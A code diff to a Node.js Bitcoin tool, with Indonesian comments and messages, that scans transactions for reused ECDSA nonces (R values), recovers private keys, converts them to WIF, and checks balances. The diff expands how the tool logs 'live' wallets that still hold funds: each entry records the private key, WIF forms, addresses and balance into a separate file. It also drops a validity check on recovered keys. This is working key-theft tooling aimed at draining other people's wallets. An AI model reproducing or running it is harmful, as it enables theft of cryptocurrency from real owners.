@@ -2,7 +2,7 @@
 import { secp256k1 } from "@noble/curves/secp256k1";
 import { sha256 } from "@noble/hashes/sha256";
 import { ripemd160 } from "@noble/hashes/ripemd160";
-import { readFileSync, appendFileSync, writeFileSync, existsSync, mkdirSync } from "node:fs";
+import { readFileSync, appendFileSync, writeFileSync, existsSync, mkdirSync, rmSync } from "node:fs";
 import { createInterface } from "node:readline/promises";
 import { stdin as input, stdout as output } from "node:process";
 
@@ -360,8 +360,7 @@ function recoverPrivateKey(r, s1, z1, s2, z2) {
         if (den === 0n) continue;
         const k = mod(num * invMod(den));
         const d = mod((sa * k - z1) * invMod(r));
-        if (d === 0n || d >= N) continue;
-        // Verifikasi: pubkey dari d harus konsisten dengan tanda tangan
+        if (d === 0n) continue;
         rs.push({ k, d });
       } catch {}
     }
@@ -395,7 +394,6 @@ const sep = (t = "") =>
 async function analyzeTx(rawHex, opts = {}) {
   const buf = hexToBytes(rawHex);
   const tx = parseTx(buf);
-  const txid = bytesToHex(reverseBytes(dsha256(buf))); // approx untuk legacy
   console.log(c(C.bold, "\n=== Analisis Transaksi Bitcoin ==="));
   console.log("Versi        :", tx.version);
   console.log("Jumlah input :", tx.vin.length);
@@ -452,18 +450,12 @@ async function analyzeTx(rawHex, opts = {}) {
     // Hitung Z (message hash)
     let z = null;
     try {
-      const scriptCode = isWitness
-        ? // P2WPKH scriptCode: OP_DUP OP_HASH160 <20> <pkh> OP_EQUALVERIFY OP_CHECKSIG
-          concat(
-            new Uint8Array([0x76, 0xa9, 0x14]),
-            pubHash,
-            new Uint8Array([0x88, 0xac])
-          )
-        : concat(
-            new Uint8Array([0x76, 0xa9, 0x14]),
-            pubHash,
-            new Uint8Array([0x88, 0xac])
-          );
+      // scriptCode P2PKH/P2WPKH (sama-sama OP_DUP OP_HASH160 <20> <pkh> OP_EQUALVERIFY OP_CHECKSIG)
+      const scriptCode = concat(
+        new Uint8Array([0x76, 0xa9, 0x14]),
+        pubHash,
+        new Uint8Array([0x88, 0xac])
+      );
       const sht = parsed.sighashType ?? 1;
       if (isWitness) {
         const amount = opts.amounts?.[i];
@@ -551,7 +543,6 @@ async function detectReuse(sigs, opts = {}) {
               seenPriv.add(dHex);
               hitCount++;
               const matchedPub = (pubCHex === a.pubkey || pubCHex === b.pubkey) ? pubCHex : pubUHex;
-              const matchedBytes = (matchedPub === pubCHex) ? pubCompressed : pubUncompressed;
               const addrCompressed = p2pkhAddress(hash160(pubCompressed));
               const addrUncompressed = p2pkhAddress(hash160(pubUncompressed));
               const wifC = toWIF(d, 0x80, true);
@@ -655,7 +646,32 @@ async function detectReuse(sigs, opts = {}) {
         (h.balanceUncompressed && h.balanceUncompressed.balanceSat > 0));
       if (live.length) {
         const liveFile = hitsFile.replace(/\.txt$/, "") + "_LIVE.txt";
-        appendFileSync(liveFile, lines.join("\n"));
+        const liveLines = [];
+        for (const h of live) {
+          liveLines.push("==========================================================  *** WALLET MASIH ADA SALDO ***");
+          liveLines.push("Waktu              : " + h.ts);
+          if (h.scannedAddress) liveLines.push("Address yang di-scan: " + h.scannedAddress);
+          liveLines.push("Private key (hex)  : " + h.privHex);
+          liveLines.push("WIF (compressed)   : " + h.wifCompressed);
+          liveLines.push("WIF (uncompressed) : " + h.wifUncompressed);
+          liveLines.push("Public key         : " + h.pubkey);
+          liveLines.push("Address compressed : " + h.addressCompressed);
+          if (h.balanceCompressed) {
+            liveLines.push("  Saldo            : " + formatBTC(h.balanceCompressed.balanceSat));
+            liveLines.push("  Total diterima   : " + formatBTC(h.balanceCompressed.totalReceivedSat));
+            liveLines.push("  Jumlah tx        : " + h.balanceCompressed.txCount);
+          }
+          liveLines.push("Address uncompress : " + h.addressUncompressed);
+          if (h.balanceUncompressed) {
+            liveLines.push("  Saldo            : " + formatBTC(h.balanceUncompressed.balanceSat));
+            liveLines.push("  Total diterima   : " + formatBTC(h.balanceUncompressed.totalReceivedSat));
+            liveLines.push("  Jumlah tx        : " + h.balanceUncompressed.txCount);
+          }
+          liveLines.push("R reuse value      : " + h.r);
+          liveLines.push("TXID terkait       : " + h.txids.join(", "));
+          liveLines.push("");
+        }
+        appendFileSync(liveFile, liveLines.join("\n"));
         console.log(c(C.green + C.bold, ">> " + live.length + " wallet HIDUP juga disalin ke: " + liveFile));
       }
     } catch (e) {
@@ -968,12 +984,11 @@ async function analyzeAddress(address, opts) {
     console.log(c(C.dim, "(gunakan --verbose untuk melihat tiap R/S/Z)"));
   }
   if (opts.out) {
-    const fs = await import("node:fs");
     const out = allSigs.map((s) => ({
       txid: s.txid, inputIndex: s.inputIndex,
       r: padHex(s.r), s: padHex(s.s), z: padHex(s.z), pubkey: s.pubkey,
     }));
-    fs.writeFileSync(opts.out, JSON.stringify(out, null, 2));
+    writeFileSync(opts.out, JSON.stringify(out, null, 2));
     console.log(c(C.green, "Disimpan ke: " + opts.out));
   }
   await detectReuse(allSigs, {
@@ -996,7 +1011,7 @@ async function analyzeByTxid(txid, opts = {}) {
       amounts[i] = meta.vin[i].prevout.value;
     }
   }
-  analyzeTx(hex.trim(), { amounts });
+  await analyzeTx(hex.trim(), { amounts });
 }
 
 
@@ -1082,7 +1097,7 @@ async function interactiveMenu() {
     console.log("  " + c(C.cyan, "7") + ") Hapus cache (.btc-cache/)");
     console.log("  " + c(C.cyan, "0") + ") Keluar\n");
 
-    const choice = (await ask(c(C.bold, "Pilihan [1-7]: "))).trim();
+    const choice = (await ask(c(C.bold, "Pilihan [0-7]: "))).trim();
 
     if (choice === "0" || choice === "") { rl.close(); return; }
 
@@ -1132,9 +1147,8 @@ async function interactiveMenu() {
       help();
     } else if (choice === "7") {
       rl.close();
-      const fsx = await import("node:fs");
       if (existsSync(CACHE_DIR)) {
-        fsx.rmSync(CACHE_DIR, { recursive: true, force: true });
+        rmSync(CACHE_DIR, { recursive: true, force: true });
         console.log(c(C.green, "Cache .btc-cache/ dihapus."));
       } else {
         console.log("Tidak ada cache untuk dihapus.");
@@ -1151,9 +1165,8 @@ async function interactiveMenu() {
 async function main() {
   if (hasFlag("no-cache")) CACHE_ENABLED = false;
   if (cmd === "clear-cache") {
-    const fsx = await import("node:fs");
     if (existsSync(CACHE_DIR)) {
-      fsx.rmSync(CACHE_DIR, { recursive: true, force: true });
+      rmSync(CACHE_DIR, { recursive: true, force: true });
       console.log(c(C.green, "Cache .btc-cache/ dihapus."));
     } else {
       console.log("Tidak ada cache untuk dihapus.");
